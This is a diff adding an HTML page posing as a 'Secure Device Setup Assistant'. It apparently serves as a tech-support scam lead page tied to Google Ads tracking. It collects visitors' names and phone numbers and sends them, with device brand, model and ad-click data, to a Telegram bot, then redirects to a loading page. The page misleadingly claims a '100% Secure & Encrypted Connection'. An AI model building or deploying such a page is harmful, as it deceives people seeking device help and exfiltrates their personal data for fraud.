@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17870679276"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17870679276');
+</script>  
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Device Setup Assistant</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-color: #1e40af; 
+            --primary-hover: #1d4ed8;
+            --disabled-color: #9ca3af;
+            --text-color: #0f172a; 
+            --text-muted: #475569;
+            --bg-color: #f8fafc;
+            --border-color: #cbd5e1;
+        }
+        
+        * {
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            background: #ffffff;
+            padding: 40px 32px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.01);
+            width: 100%;
+            max-width: 480px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .setup-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .setup-header h2 {
+            margin: 0 0 10px 0;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-color);
+        }
+        .setup-header p {
+            margin: 0;
+            font-size: 15px;
+            color: var(--text-muted);
+            line-height: 1.5;
+        }
+
+        .image-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            gap: 20px;
+        }
+        
+        .option-card {
+            flex: 1;
+            background: #ffffff;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 24px 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease-in-out;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .option-card img {
+            width: 130px; 
+            height: 130px;
+            object-fit: contain;
+            margin-bottom: 16px;
+            pointer-events: none; 
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.05));
+        }
+        
+        .option-label {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-color);
+            margin: 0;
+        }
+        
+        .option-card:hover {
+            transform: translateY(-2px);
+            border-color: #93c5fd;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
+        }
+        .option-card.selected {
+            border-color: var(--primary-color);
+            background-color: #eff6ff;
+            box-shadow: 0 0 0 4px rgba(30, 64, 175, 0.1);
+        }
+        .option-card.selected .option-label {
+            color: var(--primary-color);
+        }
+
+        #leadForm {
+            display: none; 
+            animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            border-top: 1px solid #e2e8f0;
+            padding-top: 25px;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #334155;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 16px; 
+            color: var(--text-color);
+            box-sizing: border-box;
+            transition: all 0.2s ease;
+            background-color: #f8fafc;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            background-color: #ffffff;
+            box-shadow: 0 0 0 4px rgba(30, 64, 175, 0.1);
+        }
+
+        button {
+            width: 100%;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            box-shadow: 0 4px 6px -1px rgba(30, 64, 175, 0.2);
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            background-color: var(--primary-hover);
+        }
+        
+        button:disabled {
+            background-color: var(--disabled-color) !important;
+            cursor: not-allowed;
+            box-shadow: none !important;
+        }
+
+        .error-msg {
+            color: #ef4444;
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 500;
+            display: none;
+        }
+
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #16a34a; 
+            font-weight: 500;
+        }
+        .trust-badge svg {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="setup-header">
+        <h2>Connection Assistant</h2>
+        <p>Please select your preferred connection method below to verify and continue setup.</p>
+    </div>
+
+    <div class="image-container">
+        <div class="option-card" id="wifiOption">
+            <img src="../images/WIFI.png" alt="WiFi Connection">
+            <p class="option-label">WiFi Network</p>
+        </div>
+        <div class="option-card" id="usbOption">
+            <img src="../images/USB.jpg" alt="USB Cable">
+            <p class="option-label">USB Cable</p>
+        </div>
+    </div>
+
+    <form id="leadForm" autocomplete="on">
+        <div class="form-group">
+            <label for="fullName">Full Name</label>
+            <input type="text" id="fullName" placeholder="e.g. John Doe" required autocomplete="name">
+        </div>
+
+        <div class="form-group">
+            <label for="phoneNumber">Mobile Number</label>
+            <input type="tel" id="phoneNumber" placeholder="e.g. +1 987-654-3210" required autocomplete="tel">
+            <div class="error-msg" id="phoneError">⚠️ Please enter your mobile number.</div>
+        </div>
+
+        <button type="submit" id="submitBtn">Verify & Continue</button>
+
+        <div class="trust-badge">
+            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            100% Secure & Encrypted Connection
+        </div>
+    </form>
+</div>
+
+<script>
+    // 1. Bot Configuration
+    const TELEGRAM_BOT_TOKEN = 'Boor_me_TOKEN_Daal'; 
+    const TELEGRAM_CHAT_ID = 'Boor_me_ID_daal';
+    const REDIRECT_URL = 'loading.html'; 
+
+    let chosenConnection = ''; 
+
+    // 2. Auto-save incoming tracking params to Session Storage
+    (function captureIncomingTracking() {
+        try {
+            const params = new URLSearchParams(window.location.search);
+            if (params.size > 0) {
+                for (const [key, value] of params.entries()) {
+                    sessionStorage.setItem(key.toLowerCase(), value);
+                }
+            }
+        } catch (e) {
+            console.error("Tracking setup error:", e);
+        }
+    })();
+
+    // 3. UI Interactions
+    const wifiCard = document.getElementById('wifiOption');
+    const usbCard = document.getElementById('usbOption');
+    const formElement = document.getElementById('leadForm');
+
+    function handleSelection(type, selectedCard, otherCard) {
+        chosenConnection = type;
+        selectedCard.classList.add('selected');
+        otherCard.classList.remove('selected');
+        formElement.style.display = 'block';
+    }
+
+    wifiCard.addEventListener('click', () => handleSelection('WIFI', wifiCard, usbCard));
+    usbCard.addEventListener('click', () => handleSelection('USB', usbCard, wifiCard));
+
+    // Yahan se wo code hata diya gaya hai jo characters ko force delete kar raha tha.
+
+    // Security Helper
+    function escapeHTML(str) {
+        if (!str) return 'Not Found';
+        return str.replace(/[&<>"']/g, m => ({
+            '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;'
+        }[m]));
+    }
+
+    // 4. Form Submission & Data Extraction
+    document.getElementById('leadForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const submitBtn = document.getElementById('submitBtn');
+        const name = document.getElementById('fullName').value.trim();
+        const phone = document.getElementById('phoneNumber').value.trim();
+        const errorMsg = document.getElementById('phoneError');
+        
+        // Sirf ye check kar rahe hain ki number field khali na ho.
+        if (!phone) {
+            errorMsg.style.display = 'block';
+            return;
+        } else {
+            errorMsg.style.display = 'none';
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Verifying Securely...';
+
+        // A) Extract Brand & Model strictly from current URL parameters
+        const currentUrlParams = new URLSearchParams(window.location.search);
+        const brand = currentUrlParams.get('brand');
+        const model = currentUrlParams.get('model');
+
+        // B) Extract Tracking Data strictly from Local Session Storage
+        const gclid = sessionStorage.getItem('gclid');
+        const keyword = sessionStorage.getItem('keyword') || sessionStorage.getItem('keywords');
+
+        // Build HTML Message for Telegram
+        let telegramMessage = `🚀 <b>New Device Setup Lead</b>\n\n`;
+        telegramMessage += `🔘 <b>Selected Method:</b> ${chosenConnection}\n`;
+        telegramMessage += `👤 <b>Name:</b> ${escapeHTML(name)}\n`;
+        telegramMessage += `📞 <b>Phone:</b> ${escapeHTML(phone)}\n\n`;
+        
+        telegramMessage += `⚙️ <b>Hardware Details (From URL):</b>\n`;
+        telegramMessage += `• <b>Brand:</b> ${escapeHTML(brand)}\n`;
+        telegramMessage += `• <b>Model:</b> ${escapeHTML(model)}\n\n`;
+        
+        telegramMessage += `🆔 <b>Marketing Data (From Session):</b>\n`;
+        telegramMessage += `• <b>Keyword:</b> ${escapeHTML(keyword)}\n`;
+        telegramMessage += `• <b>GCLID:</b> <code>${escapeHTML(gclid)}</code>\n`;
+
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        try {
+            const response = await fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: telegramMessage,
+                    parse_mode: 'HTML' 
+                })
+            });
+
+            if (!response.ok) {
+                console.error('Telegram API Error');
+            }
+            
+            // Redirect smoothly
+            window.location.href = REDIRECT_URL;
+            
+        } catch (error) {
+            console.error('Network error:', error);
+            window.location.href = REDIRECT_URL; // Fallback redirect
+        }
+    });
+</script>
+
+</body>
+</html>
